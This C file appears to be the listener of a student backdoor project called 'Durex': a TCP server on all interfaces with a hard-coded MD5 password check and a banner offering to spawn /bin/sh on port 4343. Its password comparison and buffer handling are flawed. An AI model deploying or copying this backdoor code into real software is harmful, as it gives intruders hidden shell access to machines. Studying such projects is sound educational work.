/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 16:44:24 by banthony          #+#    #+#             */
/*   Updated: 2019/11/22 17:27:07 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <time.h>
#include "server.h"
#include "durex_log.h"
#include "message_digest.h"
#include "Durex.h"

/*
**	Build client prefix string: 'Client[x.x.x.x]:'
*/
t_bool	client_prefix(void *data, char (*prefix)[PREFIX_SIZE])
{
	t_client *client;

	if (!(client = (t_client*)data) || !prefix)
		return (false);
	if (7 + 2 +  ft_strlen(client->addr) >= PREFIX_SIZE)
		return (false);
	ft_strncpy(&(*prefix)[0], "Client[", 7);
	ft_strncat(&(*prefix)[0], client->addr, ft_strlen(client->addr));
	ft_strncat(&(*prefix)[0], "]:", 2);
	return (true);
}

void		send_text(char *text, int socket)
{
	if (socket > 0 && text)
		send(socket, text, ft_strlen(text), 0);
}

static void		welcome_client(t_client *clt)
{
	char *durex_header;
	char *shell_header;

	durex_header =	"/* ************************************************************************** */\n"
					"/*                                                        :::      ::::::::   */\n"
					"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"
										"                           :+:      :+:    :+:   */\n"
					"/*                                                    +:+ +:+         +:+     */\n"
					"/*      * 3 clients max                             +#+  +:+       +#+        */\n"
					"/*      * Enter 'help' to see all commands        +#+#+#+#+#+   +#+           */\n"
					"/*                                                     #+#    #+#             */\n"
					"/*                                                    ###   ########          */\n"
					"/* ************************************************************************** */\n"
					"\nDurex>";
	shell_header =	"/* ************************************************************************** */\n"
					"/*                                                        :::      ::::::::   */\n"
					"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"
												"                           :+:      :+:    :+:   */\n"
					"/*                                                    +:+ +:+         +:+     */\n"
					"/*      * Spawn /bin/sh on port 4343                +#+  +:+       +#+        */\n"
					"/*                                                +#+#+#+#+#+   +#+           */\n"
					"/*                                                     #+#    #+#             */\n"
					"/*                                                    ###   ########          */\n"
					"/* ************************************************************************** */\n";

	if (!clt->granted)
	{
		send_text(durex_header, clt->socket);
		clt->granted = true;
	}
	else
		send_text(shell_header, clt->socket);
	durex_log_with(CLIENT_LOG, LOG_INFO, client_prefix, clt);
}

static t_bool	add_client(t_server *server, int cs, struct sockaddr_in csin)
{
	t_list		*nc;
	t_client	new_client;

	new_client.socket = cs;
	new_client.addr = inet_ntoa(csin.sin_addr);
	new_client.granted = !server->require_pass;
	new_client.timestamp = time(NULL);
	if (!(nc = ft_lstnew(&new_client, sizeof(new_client))))
	{
		durex_log(ALLOC_ERR("Connexion aborted."), LOG_WARNING);
		send_text(ALLOC_ERR("Connexion aborted."), cs);
		FD_CLR(cs, &server->fdset);
		close(cs);
		return (false);
	}

	if (server->client_lst == NULL)
		server->client_lst = nc;
	else
		ft_lstadd(&server->client_lst, nc);

	if (!new_client.granted)
		send_text(PASS_REQUEST, cs);
	else
		welcome_client(&new_client);
	FD_SET(cs, &server->fdset);
	server->clients++;
	durex_log_with(CLIENT_LOGIN, LOG_INFO, client_prefix, &new_client);
	return (true);
}

t_bool	new_client(t_server *server)
{
	int					cs;
	unsigned int		cs_len;
	struct sockaddr_in	csin;

	if ((cs = accept(server->socket, (struct sockaddr*)&csin, &cs_len)) < 0)
	{
		durex_log(ACCEPT_ERR, LOG_ERROR);
		durex_log(strerror(errno), LOG_ERROR);
		return (false);
	}
	if (server->clients >= server->client_limit)
	{
		durex_log(CONNEXION_REFUSED, LOG_INFO);
		send_text(CONNEXION_REFUSED, cs);
		FD_CLR(cs, &server->fdset);
		close(cs);
		return (false);
	}
	return (add_client(server, cs, csin));
}

t_bool	deco_client(t_client *client, t_server *server)
{
	t_list		*elmt;
	t_list		*prev;
	t_client	*stored_client;

	prev = NULL;
	elmt = server->client_lst;
	if (!client || !server || !elmt)
		return (false);
	durex_log("Deco client !", LOG_INFO);
	while (elmt)
	{
		stored_client = (t_client*)elmt->content;
		if (stored_client->socket == client->socket)
		{
			FD_CLR(client->socket, &server->fdset);
			close(client->socket);
			durex_log_with(DISCONNECTED, LOG_INFO, client_prefix, client);
			server->clients--;
			// If we are not on the first elmt, relink the list
			if (prev)
				prev->next = elmt->next;
			// Update the first elmt if it's the first elmt
			else
				server->client_lst = elmt->next;
			// Finally delete this elmt
			ft_lstdelone(&elmt, del_client);
			break ;
		}
		prev = elmt;
		elmt = elmt->next;
	}
	return (true);
}

t_bool	create_server(t_server *server, int port, size_t client_limit)
{
	int					sock;
	struct sockaddr_in	sin;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	if ((bind(sock, (const struct sockaddr*)&sin, sizeof(sin))) < 0)
	{
		durex_log(BIND_ERR, LOG_ERROR);
		return (false);
	}
	listen(sock, MAX_PENDING_CLIENT);
	server->client_limit = client_limit;
	server->port = port;
	server->socket = sock;
	return (true);
}

static t_bool	client_handler(t_server *server, int fd)
{
	t_list		*elmt;
	t_client	*client;
	char		buf[READ_BUFFER_SIZE];
	char		*hash_pass;
	ssize_t		ret;

	elmt = server->client_lst;
	while (elmt)
	{
		client = (t_client*)elmt->content;
		if (fd == client->socket)
		{
			// use rcv instead
			if ((ret = recv(client->socket, buf, READ_BUFFER_SIZE, 0)) <= 0)
				return (deco_client(client, server));
			client->timestamp = time(NULL);
			if (client->granted == false)
			{
				hash_pass = md5_digest((unsigned char*)buf, ret, 0);
				(!ft_strncmp(hash_pass, PASSWORD, (size_t)ret)) ? welcome_client(client)
					: send_text(PASS_REQUEST, fd);
				elmt->content = client;
				ft_strdel(&hash_pass);
				break ;
			}
			buf[ret] = '\0';
			server_command_handler(buf, ret, server, client);
			break ;
		}
		elmt = elmt->next;
	}
	return (true);
}

static void	kill_afk(t_server *server)
{
	time_t		now;
	t_list		*lst;
	t_client	*clt;
	t_client	*target;
	struct stat file;

	lst = server->client_lst;
	while (lst)
	{
		clt = (t_client*)lst->content;
		now = time(NULL);
		target = NULL;
		ft_memset(&file, 0, sizeof(file));
		if (clt->granted)
			send_text(COLORIZE(SH_YELLOW, "Durex :")" Are you alive ?\n"SERVER_PROMPT, clt->socket);
		else
			send_text(COLORIZE(SH_YELLOW, "Durex :")" Are you alive ?\n"PASS_REQUEST, clt->socket);
		if (difftime(now, clt->timestamp) > CLIENT_TIMEOUT || fstat(clt->socket, &file))
			target = clt;
		lst = lst->next;
		if (target)
		{
			durex_log_with(TIMEOUT_MSG, LOG_INFO, client_prefix, clt);
			send_text(TIMEOUT_MSG, target->socket);
			deco_client(target, server);
		}
	}
}

t_bool	server_loop(t_server *server)
{
	int		i;
	int		ret;
	fd_set	readfdset;
	struct	timeval timeout;

	FD_ZERO(&readfdset);
	FD_ZERO(&server->fdset);
	FD_SET(server->socket, &server->fdset);
	durex_log(SERVER_STARTED, LOG_INFO);
	while (42)
	{
		readfdset = server->fdset;
		timeout = (struct timeval){SERVER_REFRESH, 0};
		(!timeout.tv_sec) ? (timeout.tv_sec++) : ((void)i);
		if ((ret = select(FD_SETSIZE, &readfdset, NULL, NULL, &timeout)) < 0)
		{
			durex_log(SELECT_ERR, LOG_ERROR);
			durex_log(strerror(errno), LOG_ERROR);
		}
		i = -1;
		while (++i < FD_SETSIZE)
		{
			// Does this descriptor is ready for read ?
			if (FD_ISSET(i, &readfdset) == 0)
				continue;
				// If it correspond to the server descriptor, handle a new connexion
			if (FD_ISSET(server->socket, &readfdset))
				new_client(server);
			// Otherwise, handle client data
			else
				client_handler(server, i);
		}
		if (ret == 0)
			kill_afk(server);
	}
}
